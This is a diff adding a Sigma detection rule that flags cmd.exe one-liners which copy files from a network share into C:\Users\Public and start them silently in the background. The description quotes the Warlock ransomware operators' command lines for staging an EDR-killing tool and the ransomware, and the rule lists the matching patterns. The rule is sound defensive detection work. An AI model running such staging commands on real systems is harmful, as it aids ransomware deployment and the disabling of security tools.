@@ -1,0 +1,35 @@
+title: Cmd Copies Files From Network Share To Users Public And Starts Them In Background
+id: b3539851-505b-4103-a0a9-06b7ad361df4
+status: experimental
+description: |
+    Detects a cmd.exe one-liner that copies files from a UNC share and then launches an executable from C:\Users\Public with start /B cmd /c "... 2>nul || exit".
+    Symantec reports that the Warlock ransomware attackers pushed an AV/EDR-killing tool with
+    net use \\[IP_ADDRESS] ... & copy \\[IP_ADDRESS]\av\* CSIDL_PROFILE\public /y & start /B cmd /c "c:\users\public\a.exe log 2>nul || exit"
+    and deployed the ransomware with copy \\[REMOVED]\SYSVOL\[VICTIM DOMAIN]\scripts\run\* CSIDL_PROFILE\public /y & start /B cmd /c "c:\users\public\run.exe 2>nul || exit".
+references:
+    - https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
+author: Esmond Er
+date: 2026-10-04
+modified: 2026-10-04
+tags:
+    - attack.lateral-movement
+    - attack.t1570
+    - attack.execution
+    - attack.t1059.003
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_img:
+        - Image|endswith: '\cmd.exe'
+        - OriginalFileName: 'Cmd.Exe'
+    selection_cli:
+        CommandLine|contains|all:
+            - 'copy \\\\'
+            - 'start /B cmd /c'
+            - '\users\public\'
+            - '2>nul || exit'
+    condition: all of selection_*
+falsepositives:
+    - Software deployment or logon scripts that stage an installer from a file share into C:\Users\Public and start it silently in the background
+level: high
